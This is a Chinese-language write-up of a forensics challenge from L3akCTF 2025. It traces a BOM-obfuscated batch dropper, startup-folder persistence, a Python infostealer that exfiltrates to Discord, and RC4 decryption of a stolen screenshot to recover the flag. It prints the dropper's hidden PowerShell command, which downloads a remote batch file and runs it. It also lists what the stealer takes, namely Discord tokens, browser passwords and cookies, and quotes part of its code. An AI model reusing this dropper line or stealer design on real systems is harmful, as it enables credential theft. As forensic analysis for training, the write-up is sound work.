# L3akCTF 2025 BOMbardino Crocodilo Writeup

## 题目简述

题目给出一份 Windows 磁盘工件和攻击者外发的 EML 邮件。攻击链包含以 Byte Order Mark 混淆的批处理脚本、启动目录持久化、Python 信息窃取器以及 Discord C2。flag 分成两段：

- 第一段藏在持久化脚本 `WindowsSecure.bat` 的字符串混淆中；
- 第二段位于被 RC4 加密后外传的桌面截图中。

仓库中的官方 `solution.md` 只给出总体路线。下面结合该说明和公开复现材料，把每一层工件之间的关系补完整。

## 解题过程

### 从邮件定位外传渠道

EML 邮件中包含攻击者使用的 `LobsterLeaks` Discord 邀请。对应频道里可以看到受害主机元数据、空的密码归档和 `pay2winflag.jpg.enc`。邀请本身可能失效，而且需要外部平台登录，所以真正需要保留的是这三个事实：

1. 邮件把磁盘侧攻击链和 Discord 外传端关联起来；
2. `pay2winflag.jpg.enc` 是加密后的桌面截图；
3. 解密密钥应当从磁盘内的窃取器代码恢复，而不是在 Discord 中猜测。

### 识别 BOM 混淆

下载目录中的 `Lil L3ak secret plans for tonight.bat` 以字节 `FF FE` 开头。编辑器因此把后续 ASCII 批处理文本误判为 UTF-16LE，显示成大量无意义字符。

先确认文件头：

```powershell
Format-Hex -LiteralPath '.\Lil L3ak secret plans for tonight.bat' -Count 32
```

去掉最前面的 `FF FE` 并清理无用的 `echo` 后，第一阶段实际执行：

```bat
start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat' -OutFile '%TEMP%\temp.bat'; Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden"
```

远端文件已经不可用，但磁盘的 `%TEMP%` 中仍保留 `temp.bat`。它也使用相同的 BOM 混淆。清理后可归纳为：

```text
下载 ud.bat
  -> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecure.bat

下载 Document.zip
  -> C:\Users\Public\Document.zip
  -> 解压到 C:\Users\Public\Document
  -> 用随包 Python 执行 Lib\leak.py
  -> 删除 Document.zip
```

`WindowsSecure.bat` 位于当前用户启动目录，是攻击者的自动启动扩展点；`Document` 中则是便携 Python 环境和真正的窃取器。

### 还原 `leak.py`

`leak.py` 使用“字符串倒序后 Base64 解码，再 `exec`”的方式嵌套多层。可以反复执行下面的等价操作，直到出现 `psutil`、`discord`、`PIL` 等正常导入语句：

```python
import base64

layer = encoded_blob
while b"import psutil" not in layer:
    layer = base64.b64decode(layer[::-1])

print(layer.decode())
```

还原后的脚本会：

- 收集主机、网络、磁盘和地理位置等系统信息；
- 提取 Discord token、Chromium 系浏览器密码和 cookie；
- 把密码写入 `C:\ProgramData\passwords.txt` 并打包；
- 截取桌面为 `C:\ProgramData\pay2winflag.jpg`；
- 通过 Discord bot 把数据发到 `LobsterLeaks`；
- 删除截图、加密截图、密码归档和系统信息等临时文件。

第二段 flag 所在截图的加密代码最关键：

```python
from PIL import ImageGrab
from Crypto.Cipher import ARC4

screenshot = ImageGrab.grab()
screenshot.save(r"C:\ProgramData\pay2winflag.jpg")

key = b"tralalero_tralala"
cipher = ARC4.new(key)
encrypted = cipher.encrypt(open(
    r"C:\ProgramData\pay2winflag.jpg", "rb"
).read())
```

因此从 Discord 取回 `pay2winflag.jpg.enc` 后直接用同一 RC4 密钥解密：

```python
from Crypto.Cipher import ARC4

data = open("pay2winflag.jpg.enc", "rb").read()
plain = ARC4.new(b"tralalero_tralala").decrypt(data)
open("pay2winflag.jpg", "wb").write(plain)
```

打开截图可读出第二段：

```text
_0r_br41nr0t}
```

### 恢复持久化脚本中的第一段

不要把 `WindowsSecure.bat` 只当作普通持久化证据。它同样带有 `FF FE` BOM，去除 BOM 后还存在变量拆分和字符串拼接。按脚本顺序为变量赋值，再输出最终拼接结果，可得到：

```text
L3AK{Br40d0_st34L3r
```

将两段连接：

```text
L3AK{Br40d0_st34L3r_0r_br41nr0t}
```

仓库官方说明给出了 BOM、启动目录、Python stealer、Discord C2 和 RC4 这条主线；[公开复现记录](https://oxygen28.github.io/posts/l3akctf-2025/) 补充了已经失效的下载阶段、硬编码 RC4 密钥及各工件路径。上述必要信息已经完整写入本文。

## 方法总结

本题的关键不是把乱码直接送去翻译，而是先检查原始字节并识别 `FF FE` 造成的伪 UTF-16LE。清理两个批处理阶段后，可同时找到启动目录持久化和 Python stealer；再由 stealer 中的 RC4 密钥解密外传截图。分析此类多阶段工件时，应把邮件、磁盘路径、自动启动项和 C2 文件按时间与用途串起来，不能只盯着单个恶意脚本。
